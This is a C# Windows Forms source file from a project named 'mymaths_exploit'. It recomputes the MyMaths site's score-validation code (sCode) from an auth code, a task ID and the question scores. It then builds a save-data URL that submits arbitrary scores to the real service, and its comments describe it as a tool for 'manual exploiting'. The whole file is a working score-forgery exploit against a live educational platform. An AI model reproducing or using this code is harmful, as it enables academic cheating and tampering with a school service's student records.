using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace mymaths_exploit
{
    public partial class Form2 : Form
    {
        int authCode;
        int taskID;
        int q1score;
        int q2score;
        long sCode;

        public Form2()
        {
            InitializeComponent();
        }

        // the same sCode generator from Form1, only it doesn't navigate to the URL, only formats it and puts it into a textbox to be copied
        // only useful for manual exploiting. if the user has logged in using the browser on form1, then this can also be used to format the URL
        public void gensCode()
        {
            authCode = Int32.Parse(ac.Text);
            taskID = Int32.Parse(id.Text);
            q1score = Int32.Parse(q1.Text);
            q2score = Int32.Parse(q2.Text);
            sCode = authCode * taskID;
            sCode = (sCode + (q1score * 100)) + q2score;
            sCode = sCode * 10000;
            sCode = sCode + (taskID * taskID);
            sc.Text = sCode.ToString();

            url.Text = String.Format("http://www.mymaths.co.uk/studentRecords/saveDataOH.asp?sCode={0}&q1score={1}&q2score={2}&taskID={3}", sCode, q1score, q2score, taskID);
        }

        // the GENERATE button
        private void button1_Click(object sender, EventArgs e)
        {
            gensCode();
        }

        // retrieves the authCode and taskID from the Settings. this is old code, as this was written before everything was made automatic in Form1
        // still useful for manual exploiting
        private void Form2_Load(object sender, EventArgs e)
        {
            ac.Text = Properties.Settings.Default.authCode.ToString();
            id.Text = Properties.Settings.Default.taskID.ToString();
        }
    }
}
